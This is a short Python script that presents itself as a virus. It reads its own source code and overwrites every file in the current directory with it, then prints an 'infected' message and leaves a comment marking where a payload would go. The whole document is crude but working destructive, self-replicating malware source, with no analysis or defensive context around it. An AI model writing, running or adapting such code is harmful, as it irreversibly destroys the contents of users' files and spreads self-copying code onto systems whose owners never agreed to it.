import sys
import os
script = sys.argv[0]
direct = [i for i in os.listdir()]
with open(script, 'r') as f:
    read = f.read()
for i in direct:
    with open(i, 'w') as w:
        w.write(read)
if (open(direct[0]).read()) == read:
    print("Viral Load Infected Directory Files.")
    #Payload in here.
